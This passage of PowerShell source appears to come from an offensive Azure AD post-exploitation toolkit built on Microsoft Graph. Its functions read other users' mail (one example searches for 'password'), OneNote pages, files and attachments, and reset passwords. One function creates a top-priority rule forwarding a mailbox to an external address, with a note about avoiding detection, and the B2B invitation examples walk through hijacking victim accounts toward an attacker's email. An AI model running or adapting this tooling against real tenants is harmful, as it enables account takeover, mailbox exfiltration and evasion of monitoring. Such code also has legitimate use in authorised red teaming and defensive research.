    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true, ParameterSetName=’UserId’)]
        [string]$UserId,
        [Parameter(Mandatory= $true, ParameterSetName=’SiteId’)]
        [string]$SiteId,      
        [Parameter(Mandatory= $true)]
        [string]$FileId,
        [Parameter(Mandatory= $false)]
        [switch]$Download,
        [Parameter(Mandatory= $false)]
        [string]$OutFile
        
    )
	
    $GraphToken = Get-AAAGraphToken

    if($UserId -eq ""){
        $URL1 = "https://graph.microsoft.com/v1.0/sites/$SiteId/"
    }
    else{
        $URL1 = "https://graph.microsoft.com/v1.0/users/$UserId/"
    }

    $URL = $URL1 + "drive/items/$FileId"    
    $Params = @{  
        "URI" = $URL  
        "Method" = "GET" 
        "Headers" = @{  
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json"  
            "Authorization" = "Bearer $GraphToken"  
        }  
    } 
    $Drives = Invoke-RestMethod @Params -UseBasicParsing 
    $Drives | select id,name,lastModifiedDateTime,size,folder,package,file,parentReference,createdBy,lastModifiedBy,webUrl | Format-List id,name,lastModifiedDateTime,size,folder,@{Label="packageType"; Expression={$_.package.type}},@{Label="fileType"; Expression={$_.file.mimeType}},@{Label="parent"; Expression={"path="+$_.parentReference.path;"id="+$_.parentReference.id}},@{Label="createdBy"; Expression={$_.createdBy.user.email}},@{Label="lastModifiedBy"; Expression={$_.lastModifiedBy.user.email}},webUrl
    
    if($PSBoundParameters.ContainsKey('Download')){
        if($OutFile -eq ""){
            $OutFile = $Drives.name        
        }
        $URL = $URL1 + "drive/items/$FileId/content"  
        $Params = @{  
                "URI" = $URL  
                "Method" = "GET" 
                "Headers" = @{ 
                    "User-Agent" = Get-AAAUserAgent 
                    "Content-Type" = "application/json"  
                    "Authorization" = "Bearer $GraphToken"  
                }  
        }  
        Invoke-RestMethod @Params -OutFile $OutFile
        Write-Output "File downloaded as $OutFile"
    }    
}

<#
    Notes.Read.All, Notes.ReadWrite.All
#>
function Get-AAAOneNotes {
<#
    .SYNOPSIS
    List all One Note items of a user

    .DESCRIPTION
    List all One Note items of a user

    .Parameter UserId
    List all One Note item of a user with specified UserId (user principle name or user object ID)
    
    .Example
    Get-AAAOneNotes -UserId "hagrid29@XXX.onmicrosoft.com"

#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true, ParameterSetName=’UserId’)]
        [string]$UserId
        #[Parameter(Mandatory= $true, ParameterSetName=’SiteId’)]
        #[string]$SiteId
    )
	
    $GraphToken = Get-AAAGraphToken


    $URL1 = "https://graph.microsoft.com/v1.0/users/$UserId/"

    $URL_sections = $URL1 + "onenote/sections"     
    $URL_pages = $URL1 + "onenote/pages"    
    

    
    $Params = @{ 
        "URI" = $URL_sections 
        "Method" = "GET" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 
    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    $Result_section = $Result.value

    $Params = @{ 
        "URI" = $URL_pages 
        "Method" = "GET" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 
    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    $Result_pages = $Result.value

    $temp=@{}
    $Result_section | foreach { $temp[$_.displayName] = $_.parentNotebook.displayName}
    $Result_pages | foreach {
        $notebook = $temp[$_.parentSection.displayName]
        [PSCustomObject]@{
            Notebook=$notebook
            Section=$_.parentSection.displayName
            Page=$_.title
            id=$_.id
            lastModifiedDateTime=$_.lastModifiedDateTime
        }
    }
		
}


<#
    Notes.Read.All, Notes.ReadWrite.All
#>
function Get-AAAOneNotesContent {
<#
    .SYNOPSIS
    Download One Note item

    .DESCRIPTION
    Download One Note item from a specific user as HTML file

    .Parameter UserId
    Download One Note item from a user with specified UserId (user principle name or user object ID)

    .Parameter PageId
    ID of the One Note page the would be downloaded

    .Parameter OutHTMLFile
    File name of output

    .Example
    Get-AAAOneNotesContent -UserId "hagrid29@XXX.onmicrosoft.com" -PageId "XXXX" -OutHTMLFile output.html

#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true, ParameterSetName=’UserId’)]
        [string]$UserId,
        [Parameter(Mandatory= $true)]
        [string]$PageId,
        [Parameter(Mandatory= $true)]
        [string]$OutHTMLFile
    )
	
    $GraphToken = Get-AAAGraphToken

    $URL1 = "https://graph.microsoft.com/v1.0/users/$UserId/"

    $URL = $URL1 + "onenote/pages/$PageId/content"    
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "GET" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 
    $Result = Invoke-RestMethod @Params -OutFile $OutHTMLFile
    Write-Host "One Note downladed as $OutHTMLFile"
}

<#
    Mail.Read, Mail.ReadWrite
#>
function Get-AAAEmails {
<#
    .SYNOPSIS
    Read emails from a mailbox

    .DESCRIPTION
    Read emails from a mailbox. Defaul return top 5 messages

    .Parameter UserId
    Read emails from a mailbox of a user with specified UserId (user principle name or user object ID)

    .Parameter Top
    The value of how many top messages return

    .Parameter Search
    The keyword to search for messages

    .Parameter MessageId
    ID of message. Return details of a message and download the body as HTML file

    .Example
    Get-AAAEmails -UserId "hagrid29@XXX.onmicrosoft.com"

    .Example
    Get-AAAEmails -UserId "hagrid29@XXX.onmicrosoft.com" -Search "password" -Top 7

    .Example
    Get-AAAEmails -UserId "XXXX" -MessageId "XXXX"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $false)]
        [string]$Top,
        [Parameter(Mandatory= $false)]
        [string]$Search,
        [Parameter(Mandatory= $false)]
        [string]$MessageId,
        [Parameter(Mandatory= $false)]
        [switch]$Raw
    )
	

    $GraphToken = Get-AAAGraphToken
    
    $URL1 = "https://graph.microsoft.com/v1.0/users/$UserId/messages" 

    if(($Top -eq "") -and ($Search -eq "")){
        $URL = $URL1 + "?`$top=5"
    }
    elseif($Search -eq ""){
        $URL = $URL1 + "?`$top=$Top"        
    }
    elseif($Top -eq ""){
        $URL = $URL1 + "?`$search=$Search"
    }else{
        $URL = $URL1 + "?`$search=$Search&`$top=$Top"
    }

    if($MessageId -ne ""){
        $URL = $URL1 + "/" + [System.Web.HttpUtility]::UrlEncode($MessageId)
    } 
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "GET" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 
    $Result = Invoke-RestMethod @Params

    if($MessageId -ne ""){
        $Result | Select-Object -Property * -ExcludeProperty body
        $OutHTMLFile = $MessageId + ".html"
        $Result.body.content | out-file $OutHTMLFile
        Write-Host "Message body save as $OutHTMLFile"
    }
    elseif($PSBoundParameters.ContainsKey('Raw')){
        $Result.value
    }
    else{
        $Result.value | select  sender,ToRecipients,CcRecipients,BccRecipients,receivedDateTime,subject,bodyPreview,HasAttachments,Id | Format-List @{Label="sender"; Expression={ $_.sender.emailAddress.Address}},@{Label="Recipients"; Expression={ foreach($r in $_.ToRecipients){$r.emailAddress.Address }}},@{Label="CcRecipients"; Expression={ foreach($r in $_.CcRecipients){$r.emailAddress.Address }}},@{Label="BccRecipients"; Expression={ foreach($r in $_.BccRecipients){$r.emailAddress.Address }}},receivedDateTime,subject,bodyPreview,HasAttachments,@{Label="MessageId"; Expression={ $_.Id}}
    }
    
}


<#
    Mail.Read, Mail.ReadWrite
#>
function Get-AAAEmailAttachments {
<#
    .SYNOPSIS
    Download attachments from a specific email

    .DESCRIPTION
    Download attachments from a specific email

    .Parameter UserId
    Download attachments from a specific email from a mailbox of a user with specified UserId (user principle name or user object ID)

    .Parameter MessageId
    ID of message

    .Parameter AttachmentId
    ID of attachment. If not provided, return detail list of attachments

    .Parameter OutFile
    File name of downloaded attachment

    .Example
    Get-AAAEmailAttachments -UserId "hagrid29@XXX.onmicrosoft.com" -MessageId "XXXX"
    Get-AAAEmailAttachments -UserId "hagrid29@XXX.onmicrosoft.com" -MessageId "XXXX" -AttachmentId "XXXX"

#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $true)]
        [string]$MessageId,
        [Parameter(Mandatory= $false)]
        [string]$AttachmentId,
        [Parameter(Mandatory= $false)]
        [string]$OutFile
    )
	

    $GraphToken = Get-AAAGraphToken
    
    $URL1 = "https://graph.microsoft.com/v1.0/users/$UserId/messages/"  + [System.Web.HttpUtility]::UrlEncode($MessageId)  + "/attachments"

    if($AttachmentId -eq ""){
        $URL = $URL1
    }else{
        $URL = $URL1 + "/" + [System.Web.HttpUtility]::UrlEncode($AttachmentId)
    } 
      
    $Params = @{ 
        "URI" = $URL 
        "Method" = "GET" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 
    $Result = Invoke-RestMethod @Params -OutFile $OutHTMLFile

    if($AttachmentId -eq ""){
        $Result.value | select id,Name,Size | fl *
        
    }else{
        $b64 = $Result.contentBytes
        if($OutFile -eq ""){
            $OutFile = $Result.Name
        }
        [IO.File]::WriteAllBytes((Get-Location).Path + "\" + $OutFile,[Convert]::FromBase64String($b64))
        Write-Host "File downloaded as $OutFile"
    } 
}


<#
    MailboxSettings.Read, MailboxSettings.ReadWrite
#>
function Get-AAAEmailRules {
<#
    .SYNOPSIS
    List mail rules from a mailbox

    .DESCRIPTION
    List mail rules from a mailbox

    .Parameter UserId
    List mail rule from a mailbox of a user with specified UserId (user principle name or user object ID)

    .Example
    Get-AAAEmailRules -UserId "hagrid@XXX.onmicrosoft.com"  
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId
    )
	

    $GraphToken = Get-AAAGraphToken
    
    $URL = "https://graph.microsoft.com/v1.0/users/$UserId/mailFolders/inbox/messageRules" 
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "GET" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 
    $Result = Invoke-RestMethod @Params
    $Result.value
}


<#
    MailboxSettings.ReadWrite
#>
function New-AAAEmailRules{
<#
    .SYNOPSIS
    Create a highest order mail rule to forward email for a mailbox

    .DESCRIPTION
    Create a highest order mail rule to forward email for a mailbox. Be cautious of detection and alert of forwarding email to external mailbox

    .Parameter UserId
    Create mail rule for the mailbox of a user with specified UserId (user principle name or user object ID)

    .Parameter MailRuleDisplayName
    Display name of the mail rule to be created

    .Parameter EmailDisplayName
    Display name of the email address that forward to

    .Parameter Email
    The email address that forward to

    .Example
    Set-AAAEmailRules -UserId "hagrid29@XXX.onmicrosoft.com" -MailRuleDisplayName "Reporting Rule" -EmailDisplayName "Tommy Cheung (IT)" -Email "XXX@XXX.com"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $true)]
        [string]$MailRuleDisplayName,
        [Parameter(Mandatory= $true)]
        [string]$EmailDisplayName,
        [Parameter(Mandatory= $true)]
        [string]$Email
    )
	

    $GraphToken = Get-AAAGraphToken
    
    $URL = "https://graph.microsoft.com/v1.0/users/$UserId/mailFolders/inbox/messageRules" 
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "POST" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
        "Body" = @{
	        displayName = $MailRuleDisplayName
	        sequence = 1
	        isEnabled = $true
	        actions = @{
		        forwardTo = @(
			        @{
				        emailAddress = @{
					        name = $EmailDisplayName
					        address = $Email
				        }
			        }
		        )
	        }
        }| ConvertTo-Json -Depth 5
    } 
    $Result = Invoke-RestMethod @Params
    Write-Host "Mail rule created"
}



<#
    MailboxSettings.ReadWrite
#>
function Remove-AAAEmailRules{
<#
    .SYNOPSIS
    Remove a mail rule for a mailbox

    .DESCRIPTION
    Remove a mail rule for a mailbox

    .Parameter UserId
    Remove mail rule for the mailbox of a user with specified UserId (user principle name or user object ID)

    .Parameter MailRuleId
    ID of the email rule to be removed

    .Example
    Remove-AAAEmailRules -UserId "hagrid29@XXX.onmicrosoft.com" -MailRuleId "XXXX"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $true)]
        [string]$MailRuleId
    )
	

    $GraphToken = Get-AAAGraphToken
    
    $URL = "https://graph.microsoft.com/v1.0/users/$UserId/mailFolders/inbox/messageRules/$MailRuleId" 
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "DELETE" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 
    $Result = Invoke-RestMethod @Params
    Write-Host "Mail rule deleted"
}


<#
    User.Read.All, User.ReadWrite.All, Directory.Read.All, Directory.ReadWrite.All
#>
function Get-AAAUser {
<#
    .SYNOPSIS
    List detailed properties of users

    DESCRIPTION
    List detailed properties of users

    .Parameter UserId
    List detailed properties of a user with specified UserId (user principle name or user object ID)

    .Parameter Search
    The keyword in displayname to search for a user

    .Example
    Get-AAAUser

    .Example
    Get-AAAUser -UserId "hagrid29@XXX.onmicrosoft.com"

    .Example
    # search for AAD Sync service account
    Get-AAAUser -Search "sync"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $false)]
        [string]$UserId,
        [Parameter(Mandatory= $false)]
        [string]$Search
    )

    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/beta/users"

    if($Search -ne ""){
        $URL = $URL + "?`$search=`"displayName:$Search`""
    }
    elseif($UserId -ne ""){
        $URL = $URL + "/$UserId"
    }
    else{
        $TotalCount = Get-AAATotalCount -URL $URL -GraphToken $GraphToken
        
        if($TotalCount -gt 1000){
            Write-Host "Total $TotalCount results. More than maximum limit 999. Only top 999 result returned"
            $TotalCount = 999
        }

        $URL = $URL + "?`$top=$TotalCount"
    }
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "GET" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
            "ConsistencyLevel" = "eventual"
        } 
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 

    if($Result.PSobject.Properties.name -match "value"){
        $Result.value
    }
    else{
        $Result
    }
    
}



<#
    User.Read.All, User.ReadWrite.All, Directory.Read.All, Directory.ReadWrite.All
#>
function Get-AAAUserDevices {
<#
    .SYNOPSIS
    List registered devices of a user

    DESCRIPTION
    List registered devices of a user

    .Parameter UserId
    List registered devices of a user with specified UserId (user principle name or user object ID)

    .Example
    Get-AAAUserDevices -UserId "hagrid29@XXX.onmicrosoft.com"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId
    )
	
    $GraphToken = Get-AAAGraphToken
    
    $URL = "https://graph.microsoft.com/v1.0/users/$UserId/registeredDevices"
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "GET" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 

    $Result.value | select accountEnabled,approximateLastSignInDateTime,createdDateTime,deviceCategory,deviceOwnership,displayName,enrollmentType,managementType,manufacturer,onPremisesLastSyncDateTime,onPremisesSyncEnabled,operatingSystem,operatingSystemVersion,profileType,registrationDateTime,trustType
}



<#
    User.Read.All, User.ReadWrite.All, Directory.Read.All, Directory.ReadWrite.All
#>
function Get-AAAUserMemberOf {
<#
    .SYNOPSIS
    List direct and transitive memberships of a user

    DESCRIPTION
    List direct and transitive memberships of a user

    .Parameter UserId
    List direct and transitive memberships of a user with specified UserId (user principle name or user object ID)

    .Example
    Get-AAAUserMemberOf -UserId "hagrid29@XXX.onmicrosoft.com"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId
    )
	
    $GraphToken = Get-AAAGraphToken
    
    $URL = "https://graph.microsoft.com/v1.0/users/$UserId/transitiveMemberOf"
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "GET" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 

    $Result.value 
}


<#
    GroupMember.Read.All, Group.Read.All, Directory.Read.All, Group.ReadWrite.All, Directory.ReadWrite.All
#>
function Get-AAAGroups {
<#
    .SYNOPSIS
    List detailed properties of all groups

    DESCRIPTION
    List detailed properties of all groups

    .Parameter Search
    The keyword in displayname to search for a group

    .Example
    Get-AAAGroups

    .Example
    Get-AAAGroups -Search "ctx"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $false)]
        [string]$Search
    )
	
    $GraphToken = Get-AAAGraphToken
    
    $URL = "https://graph.microsoft.com/v1.0/groups"
    
    if($Search -ne ""){
        $URL = $URL + "?`$search=`"displayName:$Search`""
    }
    else{
        $TotalCount = Get-AAATotalCount -URL $URL -GraphToken $GraphToken
        
        if($TotalCount -gt 1000){
            Write-Host "Total $TotalCount results. More than maximum limit 999. Only top 999 result returned"
            $TotalCount = 999
        }

        $URL = $URL + "?`$top=$TotalCount"
    }


    $Params = @{ 
        "URI" = $URL 
        "Method" = "GET" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
            "ConsistencyLevel" = "eventual"
        } 
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 

    $Result.value
}


<#
    GroupMember.Read.All, Group.Read.All, Directory.Read.All, Group.ReadWrite.All, Directory.ReadWrite.All
#>
function Get-AAAGroupMembers {
<#
    .SYNOPSIS
    List direct and transitive members of a group

    DESCRIPTION
    List direct and transitive members of a group

    .Parameter GroupId
    List direct and transitive memberships of a group with specified GroupId

    .Example
    Get-AAAGroupMembers -GroupId "XXX"
#>

    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$GroupId
    )	

    $GraphToken = Get-AAAGraphToken
    
    $URL = "https://graph.microsoft.com/v1.0/groups/$GroupID/transitiveMembers"
    

    $Params = @{ 
        "URI" = $URL 
        "Method" = "GET" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 

    $Result.value
}


<#
    ref: https://learn.microsoft.com/en-us/graph/api/resources/users?view=graph-rest-1.0#who-can-update-sensitive-attributes
    Auth Admin, User Admin, Privileged Auth Admin, Global Admin
#>
function Set-AAAUserPassword{
<#
    .SYNOPSIS
    Change password of users

    DESCRIPTION
    Change password of users

    .Parameter UserId
    Change password of a user with specified UserId (user principle name or user object ID)

    .Parameter password
    The value of password to be set

    .Example
    Set-AAAUserPassword -UserId "hagrid29@XXX.onmicrosoft.com" -password "P@ssw0rd@1112233"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $true)]
        [string]$password
    )
	
    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/v1.0/users/$UserId"
    
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "PATCH" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
        "Body" = @{
            passwordProfile = @{
		        forceChangePasswordNextSignIn = $false
		        password = $password
            }
        } | ConvertTo-Json
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 

}


<#
    User.ReadWrite.All, User.ManageIdentities.All, Directory.ReadWrite.All
#>
function Set-AAAUserDisplayname {
<#
    .SYNOPSIS
    Edit user displayname

    DESCRIPTION
    Edit user displayname

    .Parameter UserId
    Edit displayname of a user with specified UserId (user principle name or user object ID)

    .Parameter DisplayName
    The value of displayName to be set

    .Example
    Set-AAAUserDisplayname -UserId "hagrid29@XXX.onmicrosoft.com" -DisplayName "Tommy Cheung"

#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $true)]
        [string]$DisplayName
    )
	
    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/v1.0/users/$UserId"
    
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "PATCH" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
        "Body" = @{
            displayName = $DisplayName
        } | ConvertTo-Json
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 

}

<#
    User.ReadWrite.All, Directory.ReadWrite.All
#>
function Set-AAAUserMail {
<#
    .SYNOPSIS
    Edit mail property of a user

    DESCRIPTION
    Edit mail property of a user

    .Parameter UserId
    Edit mail property of a user with specified UserId (user principle name or user object ID)

    .Parameter mail
    The value of mail to be set

    .Example
    Set-AAAUserMail -UserId "hagrid29@XXX.onmicrosoft.com" -mail "XXX@XXX.com"     
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $true)]
        [string]$mail
    )
	
    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/v1.0/users/$UserId"
    
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "PATCH" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
        "Body" = @{
            mail = $mail
        } | ConvertTo-Json
    } 
    
  
    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    Write-Host "mail set"

}



<#
    ref: https://learn.microsoft.com/en-us/graph/api/resources/users?view=graph-rest-1.0#who-can-update-sensitive-attributes
    Auth Admin, User Admin, Privileged Auth Admin, Global Admin

    User.ReadWrite.All, Directory.ReadWrite.All (apply to non-admin user)
#>
function New-AAAUserOtherMails {
<#
    .SYNOPSIS
    Add a mail to OtherMails property of a user

    DESCRIPTION
    Add a mail to OtherMails property of a user

    .Parameter UserId
    Add a mail to OtherMails property of a user with specified UserId (user principle name or user object ID)

    .Parameter mail
    The value of mail to be added in OtherMails property

    .Example
    New-AAAUserOtherMails -UserId "hagrid29@XXX.onmicrosoft.com" -otherMails "XXX@XXX.com"     
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $true, ParameterSetName=’otherMails’)]
        [string]$otherMails
    )
	
    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/v1.0/users/$UserId"
    
    $otherMailList = (Get-AAAUser -UserId $UserId).otherMails
    $otherMailList += $otherMails

    $Params = @{ 
        "URI" = $URL 
        "Method" = "PATCH" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
        "Body" = @{
                otherMails = $otherMailList
            } | ConvertTo-Json
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    Write-Host "New otherMail added"

}

<#
    User.ReadWrite.All, Directory.ReadWrite.All (apply to non-admin user)
#>
function Remove-AAAUserOtherMails {
<#
    .SYNOPSIS
    Remove a mail in OtherMails property of a user

    DESCRIPTION
    Remove a mail in OtherMails property of a user

    .Parameter UserId
    Remove a mail in OtherMails property of a user with specified UserId (user principle name or user object ID)

    .Parameter mail
    The value of mail to be removed in OtherMails property

    .Example
    Remove-AAAUserOtherMails -UserId "hagrid29@XXX.onmicrosoft.com" -otherMails "XXX@XXX.com"     
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $true, ParameterSetName=’otherMails’)]
        [string]$otherMails
    )
	
    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/v1.0/users/$UserId"
    
    $otherMailList = (Get-AAAUser -UserId $UserId).otherMails
    $otherMailList = $otherMailList | ?{$_ -ne $otherMails}

    if($otherMailList.Count -le 1){
        $otherMailList = @($otherMailList)
    }

    $Params = @{ 
        "URI" = $URL 
        "Method" = "PATCH" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
        "Body" = @{
                otherMails = $otherMailList
            } | ConvertTo-Json
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    Write-Host "otherMail removed"

}


<#
    ref: https://dirkjanm.io/assets/raw/US-22-Mollema-Backdooring-and-hijacking-Azure-AD-accounts_final.pdf
    Resend invitation or reset redemption: 
        User.ReadWrite.All, Directory.ReadWrite.All (apply to non-admin user)
    Send invitation: 
        User.Invite.All, User.ReadWrite.All, Directory.ReadWrite.All
#>
function Send-AAAB2BInvitation {
<#
    .SYNOPSIS
    Send/Resend B2B user's invitation or reset redemption status of a user

    DESCRIPTION
    Send/Resend B2B user's invitation or reset redemption status of a user

    .Parameter mail
    The email address for recieving the invitation email
    
    .Parameter action
    Pick an action to send/resend B2B user's invitation or reset redemption status of a user
        - sendInvitation: Invite a new B2B user
        - resendInvitation: Resend invitation email to a B2B account
        - resetRedemption: Reset an invitation redemption for a B2B account

    .Parameter UserId
    Send/Resend B2B user's invitation or reset redemption status of a user with specified UserId (user principle name or user object ID). Avalible for action "resendInvitation" and "resetRedemption"

    .Parameter Displayname
    Displayname that would be set for invited B2B user. Avalible for action "sendInvitation"

    .Parameter TenantId
    Tenant ID 

    .Parameter sendInvitationMessage
    If set to False, invitation email would not be sent. Default set to True

    .Example
    # Hijack a member without mailbox
    $victim = "hagrid29@XXX.onmicrosoft.com"
    $attackerMail = "XXX@external.com" 
    $DisplayName = "Tommy Cheung"
    Set-AAAUserMail -UserId $victim -mail $attackerMail     
    New-AAAUserOtherMails -UserId $victim -otherMails $attackerMail
    Send-AAAB2BInvitation -action resendInvitation -UserId $victim -mail $attackerMail
    Set-AAAUserDisplayname -UserId $victim -DisplayName $DisplayName   
    (Get-AAAUser -UserId $victim).identities

    .Example
    # Hijack a guest account
    $victim = "XXX"
    $attackerMail = "XXX@external.com" 
    Set-AAAUserMail -UserId $victim -mail $attackerMail     
    New-AAAUserOtherMails -UserId $victim -otherMails $attackerMail
    Send-AAAB2BInvitation -action resetRedemption -UserId $victim -mail $attackerMail

    .Example
    # Hijack a member that had been converted to B2B user already
    $victim = "hagrid29@XXX.onmicrosoft.com"
    $attackerMail = "XXX@external.com" 
    Set-AAAUserMail -UserId $victim -mail $attackerMail
    Remove-AAAUserOtherMails -UserId $victim -otherMails $attackerMail
    New-AAAUserOtherMails -UserId $victim -otherMails $attackerMail
    Send-AAAB2BInvitation -action resetRedemption -UserId $victim -mail $attackerMail

    .Example
    # Invite an external guest
    Send-AAAB2BInvitation -action sendInvitation -mail "XXX@XXX.com" -Displayname "Tommy Cheung"

#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$mail,
        [Parameter(Mandatory= $true)]
        [ValidateSet("sendInvitation", "resendInvitation" ,"resetRedemption")]
        [string]$action,
        [Parameter(Mandatory= $false)]
        [string]$UserId,
        [Parameter(Mandatory= $false)]
        [string]$Displayname,
        [Parameter(Mandatory= $false)]
        [string]$TenantId,
        [Parameter(Mandatory= $false)]
        [ValidateSet($true, $false)]
        [string]$sendInvitationMessage = $true
    )
	
    $GraphToken = Get-AAAGraphToken

    if($TenantId -eq ""){
        $TenantId = (Get-AAADataFromGraphToke -Token $GraphToken).tid
    }

    $URL = "https://graph.microsoft.com/beta/invitations"
    
    if($sendInvitationMessage -eq "false"){
        $sendInvitationMessage = $false
    }

    $body = @{
        invitedUserEmailAddress = $mail
        inviteRedirectUrl = "https://account.activedirectory.windowsazure.com/?tenantid=$TenantId&login_hint=$mail"
        sendInvitationMessage = $sendInvitationMessage
    }


    $ToResetRedemption = $false
    if($action -eq "resetRedemption"){
        $ToResetRedemption = $true
    }

    if($action -eq "sendInvitation"){
        if($Displayname -eq ""){
            Write-Host "Displayname missing"
            return
        }
        $body += @{
            invitedUserDisplayname = $Displayname
            invitedUserType = "Guest"
        }
    }
    else{
        if($UserId -eq ""){
            Write-Host "UserId missing"
            return
        }
        if($UserId.Contains("@")){
            $UserId = (Get-AAAUser -UserId $UserId).id
        }
        $body += @{
            resetRedemption = $ToResetRedemption
            invitedUser = @{
                id = $UserId 
            
            }
        }
    }

    $Params = @{ 
        "URI" = $URL 
        "Method" = "POST" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
        "Body" = $body | ConvertTo-Json
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    $Result
    
}



<#
    User.ManageIdentities.All (apply to all user), Directory.ReadWrite.All (apply to non-admin user)
#>
function New-AAAUserB2BIdentities {
<#
    .SYNOPSIS
    Add federated identity in Identities property of a user

    DESCRIPTION
    Add federated identity in Identities property of a user

    .Parameter UserId
    Add federated identity in Identities property of a user with specified UserId (user principle name or user object ID)

    .Parameter mail
    The email address for recieving the invitation email
    
